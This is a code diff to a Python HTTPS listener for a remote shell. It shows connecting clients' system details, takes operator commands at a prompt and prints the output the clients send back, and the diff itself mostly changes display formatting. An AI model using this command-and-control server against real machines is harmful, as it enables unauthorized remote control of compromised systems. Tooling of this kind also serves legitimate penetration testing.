@@ -41,14 +41,26 @@ class ShellHandler(BaseHTTPRequestHandler):
             except AttributeError:
                 self._set_headers(404)
 
+    def _open_session(self, session_info: list[str]) -> None:
+        """Displays client system information on connection."""
+
+        print("[>] Connection established")
+        info = {"Client address": ":".join(str(e) for e in self.client_address)}
+        info |= json.loads(session_info[0])
+        for key, value in info.items():
+            print("\t[+] {0:.<20} {1}".format(key, value).expandtabs(3))
+        print()
+        self._set_headers()
+
     def _prompt(self, shell_info: list[str]) -> None:
         """Builds the shell prompt with basic information received from
         the client, waits for the user's input and sends it back as a
         response."""
 
         gc, nc = "\x1b[0;32m", "\x1b[0m"  # green color, no color
-        shell = "{0}[{1}:{2}]{3} {4}".format(gc, *self.client_address,
-                                             nc, *shell_info)
+        shell = ("\t{0}[{1}:{2}]{3} {4}"
+                 .format(gc, *self.client_address, nc, *shell_info)
+                 .expandtabs(3))
         try:
             response = input(shell)
         except EOFError:
@@ -59,8 +71,8 @@ class ShellHandler(BaseHTTPRequestHandler):
     def _output(self, client_output: list[str]) -> None:
         """Sends the client's output to the user's STDOUT for evaluation
         of results."""
-
-        print(*client_output, end="")
+        for output in client_output[0].split("\n"):
+            print(f"\t{output}".expandtabs(3))
         self._set_headers()
 
     def log_message(self, *args, **kwargs):
@@ -152,9 +164,9 @@ class ShellServer:
     def execute(self) -> None:
         with HTTPServer(self.server_address, ShellHandler) as httpd:
             try:
-                print("[+] Server started on https://{0}:{1}".format(
+                print("[>] Server started on https://{0}:{1}".format(
                     *self.server_address))
-                print("[+] Waiting for connections...\n")
+                print("[>] Waiting for connections...")
                 httpd.socket = ssl.wrap_socket(sock=httpd.socket,
                                                server_side=True,
                                                certfile=str(self.server_cert),
